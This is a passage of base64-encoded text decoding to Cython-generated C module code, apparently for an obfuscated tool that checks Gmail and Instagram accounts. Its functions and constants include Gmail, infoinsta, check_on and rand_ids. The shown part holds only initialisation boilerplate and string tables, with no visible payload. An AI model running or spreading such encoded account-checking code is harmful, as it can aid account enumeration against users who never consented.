F9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcHBwcCwgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDExMSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuXG4gIFxuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3l5LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYXplcnR5dWlvcG1sa2poZ2Zkc3F3eGN2Ym4pIDwgKDApKSBfX1BZWF9FUlIoMCwgMTI2LCBfX3B5eF9MMV9lcnJvcilcblxuICBcbiAgX19weXhfdF8zID0gX19QeXhfQ3lGdW5jdGlvbl9OZXcoJl9fcHl4X21kZWZfMmpxXzN0bGwsIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90bGwsIE5VTEwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9qcSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzVdKSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDEyOSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RsbCwgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEyOSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuXG4gIFxuICBfX3B5eF90XzIgPSBOVUxMO1xuICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RsbCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDE3OSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICBfX3B5eF90XzYgPSAxO1xuICB7XG4gICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMiwgTlVMTH07XG4gICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF80LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgxLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAxNzksIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICB9XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuXG4gIFxuICBfX3B5eF90XzMgPSBfX1B5eF9DeUZ1bmN0aW9uX05ldygmX19weXhfbWRlZl8yanFfNXJlc3QsIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXN0LCBOVUxMLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfanEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYls2XSkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAxODIsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXN0LCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTgyLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMyA9IF9fUHl4X0N5RnVuY3Rpb25fTmV3KCZfX3B5eF9tZGVmXzJqcV83ZGF0ZSwgMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGUsIE5VTEwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9qcSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzddKSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDIxNywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGUsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCAyMTcsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcbiAgX19weXhfdF8zID0gX19QeXhfQ3lGdW5jdGlvbl9OZXcoJl9fcHl4X21kZWZfMmpxXzlJbmZvQWNjLCAwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSW5mb0FjYywgTlVMTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2pxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbOF0pKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMjQ2LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSW5mb0FjYywgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDI0NiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuXG4gIFxuICBfX3B5eF90XzMgPSBfX1B5eF9DeUZ1bmN0aW9uX05ldygmX19weXhfbWRlZl8yanFfMTFHbWFpbCwgMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dtYWlsLCBOVUxMLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfanEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYls5XSkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAzMDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HbWFpbCwgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDMwMSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuXG4gIFxuICBfX3B5eF90XzMgPSBfX1B5eF9DeUZ1bmN0aW9uX05ldygmX19weXhfbWRlZl8yanFfMTNmb3JtYXRfbnVtYmVyLCAwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZm9ybWF0X251bWJlciwgTlVMTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2pxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTBdKSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDM1NiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Zvcm1hdF9udW1iZXIsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCAzNTYsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcbiAgX19weXhfdF8zID0gX19QeXhfQ3lGdW5jdGlvbl9OZXcoJl9fcHl4X21kZWZfMmpxXzE1Y2hlY2tfb24sIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jaGVja19vbiwgTlVMTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2pxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTFdKSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDM2NSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NoZWNrX29uLCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzY1LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMyA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzk5LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaW5mb2luc3RhLCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzk5LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMyA9IFB5TGlzdF9OZXcoMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDQwMCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2lkcywgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQwMCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuXG4gIFxuICBfX3B5eF90XzMgPSBfX1B5eF9DeUZ1bmN0aW9uX05ldygmX19weXhfbWRlZl8yanFfMTdyYW5kX2lkcywgMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRfaWRzLCBOVUxMLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfanEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxMl0pKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNDAzLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZF9pZHMsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCA0MDMsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcbiAgX19weXhfdF8zID0gX19QeXhfQ3lGdW5jdGlvbl9OZXcoJl9fcHl4X21kZWZfMmpxXzE5dXV1LCAwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXV1LCBOVUxMLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfanEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxM10pKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNDEyLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXV1LCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgNDEyLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMyA9IFB5TGlzdF9OZXcoMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDQ2MiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RocmVhZHMsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCA0NjIsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcbiAgX19weXhfdF8zID0gX19QeXhfQ3lGdW5jdGlvbl9OZXcoJl9fcHl4X21kZWZfMmpxXzIxcHJpbnRpbmcsIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9wcmludGluZywgTlVMTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2pxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTRdKSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDQ2NSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3ByaW50aW5nLCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgNDY1LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfNCA9IE5VTEw7XG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcHJpbnRpbmcpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA0NzYsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgX19weXhfdF82ID0gMTtcbiAge1xuICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIE5VTEx9O1xuICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMS1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNDc2LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgfVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcbiAgX19weXhfdF8zID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGVzdCwgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcblxuICBnb3RvIF9fcHl4X0wwO1xuICBfX3B5eF9MMV9lcnJvcjo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTMpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTQpO1xuICBpZiAoX19weXhfbSkge1xuICAgIGlmIChfX3B5eF9tc3RhdGUtPl9fcHl4X2QgJiYgc3RyaW5ndGFiX2luaXRpYWxpemVkKSB7XG4gICAgICBfX1B5eF9BZGRUcmFjZWJhY2soImluaXQganEiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgICB9XG4gICAgI2lmICFDWVRIT05fVVNFX01PRFVMRV9TVEFURVxuICAgIFB5X0NMRUFSKF9fcHl4X20pO1xuICAgICNlbHNlXG4gICAgUHlfREVDUkVGKF9fcHl4X20pO1xuICAgIGlmIChweXN0YXRlX2FkZG1vZHVsZV9ydW4pIHtcbiAgICAgIFB5T2JqZWN0ICp0cCwgKnZhbHVlLCAqdGI7XG4gICAgICBQeUVycl9GZXRjaCgmdHAsICZ2YWx1ZSwgJnRiKTtcbiAgICAgIFB5U3RhdGVfUmVtb3ZlTW9kdWxlKCZfX3B5eF9tb2R1bGVkZWYpO1xuICAgICAgUHlFcnJfUmVzdG9yZSh0cCwgdmFsdWUsIHRiKTtcbiAgICB9XG4gICAgI2VuZGlmXG4gIH0gZWxzZSBpZiAoIVB5RXJyX09jY3VycmVkKCkpIHtcbiAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfSW1wb3J0RXJyb3IsICJpbml0IGpxIik7XG4gIH1cbiAgX19weXhfTDA6O1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgI2lmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVFxuICByZXR1cm4gKF9fcHl4X20gIT0gTlVMTCkgPyAwIDogLTE7XG4gICNlbHNlXG4gIHJldHVybiBfX3B5eF9tO1xuICAjZW5kaWZcbn1cblxuXG50eXBlZGVmIHN0cnVjdCB7XG4gICAgY29uc3QgY2hhciAqcztcbiNpZiA3MjIgPD0gNjU1MzVcbiAgICBjb25zdCB1bnNpZ25lZCBzaG9ydCBuO1xuI2VsaWYgNzIyIC8gMiA8IElOVF9NQVhcbiAgICBjb25zdCB1bnNpZ25lZCBpbnQgbjtcbiNlbGlmIDcyMiAvIDIgPCBMT05HX01BWFxuICAgIGNvbnN0IHVuc2lnbmVkIGxvbmcgbjtcbiNlbHNlXG4gICAgY29uc3QgUHlfc3NpemVfdCBuO1xuI2VuZGlmXG4jaWYgMSA8PSAzMVxuICAgIGNvbnN0IHVuc2lnbmVkIGludCBlbmNvZGluZyA6IDU7XG4jZWxpZiAxIDw9IDI1NVxuICAgIGNvbnN0IHVuc2lnbmVkIGNoYXIgZW5jb2Rpbmc7XG4jZWxpZiAxIDw9IDY1NTM1XG4gICAgY29uc3QgdW5zaWduZWQgc2hvcnQgZW5jb2Rpbmc7XG4jZWxzZVxuICAgIGNvbnN0IFB5X3NzaXplX3QgZW5jb2Rpbmc7XG4jZW5kaWZcbiAgICBjb25zdCB1bnNpZ25lZCBpbnQgaXNfdW5pY29kZSA6IDE7XG4gICAgY29uc3QgdW5zaWduZWQgaW50IGludGVybiA6IDE7XG59IF9fUHl4X1N0cmluZ1RhYkVudHJ5O1xuc3RhdGljIGNvbnN0IGNoYXIgKiBjb25zdCBfX3B5eF9zdHJpbmdfdGFiX2VuY29kaW5nc1tdID0geyAwIH07XG5zdGF0aWMgY29uc3QgX19QeXhfU3RyaW5nVGFiRW50cnkgX19weXhfc3RyaW5nX3RhYltdID0ge1xuICB7X19weXhfa18sIHNpemVvZihfX3B5eF9rXyksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfMCwgc2l6ZW9mKF9fcHl4X2tfMCksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfMF8wX251bGxfbnVsbF93ZWJfZ2xpZl9zaWdudXBfMCwgc2l6ZW9mKF9fcHl4X2tfMF8wX251bGxfbnVsbF93ZWJfZ2xpZl9zaWdudXBfMCksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfMGQwNjdjMmY4NmNhYzJjMTdkNjU1NjMxYzljZWMyNDAsIHNpemVvZihfX3B5eF9rXzBkMDY3YzJmODZjYWMyYzE3ZDY1NTYzMWM5Y2VjMjQwKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa18wZDA2N2MyZjg2Y2FjMmMxN2Q2NTU2MzFjOWNlYzI0MF8yLCBzaXplb2YoX19weXhfa18wZDA2N2MyZjg2Y2FjMmMxN2Q2NTU2MzFjOWNlYzI0MF8yKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa18wbSwgc2l6ZW9mKF9fcHl4X2tfMG0pLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rXzEsIHNpemVvZihfX3B5eF9rXzEpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rXzE3MDAyNTE1NzRfOTgyLCBzaXplb2YoX19weXhfa18xNzAwMjUxNTc0Xzk4MiksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfMV8wMDAsIHNpemVvZihfX3B5eF9rXzFfMDAwKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa18xZiwgc2l6ZW9mKF9fcHl4X2tfMWYpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rXzFrYnBzLCBzaXplb2YoX19weXhfa18xa2JwcyksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfMW0sIHNpemVvZihfX3B5eF9rXzFtKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa18yMDIwXzIwMjMsIHNpemVvZihfX3B5eF9rXzIwMjBfMjAyMyksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfMjJfMkMwXzJDMF8yQzFfMkNudWxsXzJDMF8yQzUxNiwgc2l6ZW9mKF9fcHl4X2tfMjJfMkMwXzJDMF8yQzFfMkNudWxsXzJDMF8yQzUxNiksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfMjJfMkNfMjIsIHNpemVvZihfX3B5eF9rXzIyXzJDXzIyKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa18yM182XzAsIHNpemVvZihfX3B5eF9rXzIzXzZfMCksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfMjRfN18wLCBzaXplb2YoX19weXhfa18yNF83XzApLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rXzI1XzdfMV8xLCBzaXplb2YoX19weXhfa18yNV83XzFfMSksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfMjZfOF8wLCBzaXplb2YoX19weXhfa18yNl84XzApLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rXzI3XzhfMSwgc2l6ZW9mKF9fcHl4X2tfMjdfOF8xKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa18yOF85XzAsIHNpemVvZihfX3B5eF9rXzI4XzlfMCksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfMzU2LCBzaXplb2YoX19weXhfa18zNTYpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rXzM4XzUsIHNpemVvZihfX3B5eF9rXzM4XzUpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rXzNiclR2dywgc2l6ZW9mKF9fcHl4X2tfM2JyVHZ3KSwgMCwgMSwgMH0sIFxuICB7X19weXhfa180LCBzaXplb2YoX19weXhfa180KSwgMCwgMSwgMH0sIFxuICB7X19weXhfa181MGNjNjg2MV83MDM2XzQzYjRfODAyZV9mYjQyODI3OSwgc2l6ZW9mKF9fcHl4X2tfNTBjYzY4NjFfNzAzNl80M2I0XzgwMmVfZmI0MjgyNzkpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rXzU2NzA2NzM0MzM1MjQyNywgc2l6ZW9mKF9fcHl4X2tfNTY3MDY3MzQzMzUyNDI3KSwgMCwgMSwgMH0sIFxuICB7X19weXhfa183NzE3MjY5NDg4MzM2MDAxLCBzaXplb2YoX19weXhfa183NzE3MjY5NDg4MzM2MDAxKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa185MW0sIHNpemVvZihfX3B5eF9rXzkxbSksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfOTJtLCBzaXplb2YoX19weXhfa185Mm0pLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rXzkzbSwgc2l6ZW9mKF9fcHl4X2tfOTNtKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa185NG0sIHNpemVvZihfX3B5eF9rXzk0bSksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfOTVtLCBzaXplb2YoX19weXhfa185NW0pLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rXzk2bSwgc2l6ZW9mKF9fcHl4X2tfOTZtKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa185N20sIHNpemVvZihfX3B5eF9rXzk3bSksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfOXkzTjVrTHF6aWFsUUE3ejk2QU1peUF